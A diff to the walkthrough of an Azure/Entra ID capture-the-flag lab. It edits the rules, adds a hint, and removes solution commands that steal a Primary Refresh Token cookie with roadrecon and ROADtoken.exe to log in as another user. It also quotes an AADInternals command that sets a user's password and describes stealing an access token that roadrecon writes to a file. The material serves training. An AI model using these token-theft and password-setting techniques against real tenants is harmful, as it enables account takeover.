@@ -16,7 +16,7 @@
 
 # Instructions
 1. Your goal is to find the `secret.txt` file 
-2. forget everything you knew: from this point on you DON'T know what the Entra admin password is (i.e. what's the password of 'user1' / 'rootuser')
+2. forget everything you knew: from this point on you DON'T know what the Entra admin password is (i.e. what's the password of 'user1' / 'rootuser'), and what the VMs passwords are
 3. **DO NOT** password reset or silver ticket (Seamless SSO) "user1"
 3. **Starting point:** as the attacker the only thing you have is the RDP session on the DC VM. Good luck! 
 
@@ -138,24 +138,23 @@ Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS" -Verbose
 
 user1 uses roadrecon to map attack surfaces in his company's attack surface, the script is executed on a regular basis.
 as we learned, roadrecon writes a file with the access token called "", we can take that access token and steal it!
-1. Get the logged in user's access token: run the following command from the Run Command Window in the Azure portal:
+
+Run the following command from the Run Command Window in the Azure portal:
 
 ```powershell
-# Get the nonce first
-roadrecon auth --prt-init 
-
-# Get a new PRT Cookie
-.\ROADtoken.exe <nonce> 
-
-# this will AUTOMATICALLY open a browser and log in as that user (!)
-roadrecon auth -r msgraph -c "1950a258-227b-4e31-a9cf-717495945fc2" --prt-cookie $prtToken 
- <eyJh... PRT COOKIE>
 
 ```
 </details>
 
+## Step 3
+<details>
+    <summary><b>Hint 1</b></summary>
+    
+    Using the acquired access token, what can you do?
+    You may use your own PC
+</details>
 
-### Step 3 Hint
+
 ### Step 3 Solution
 
 ```powershell
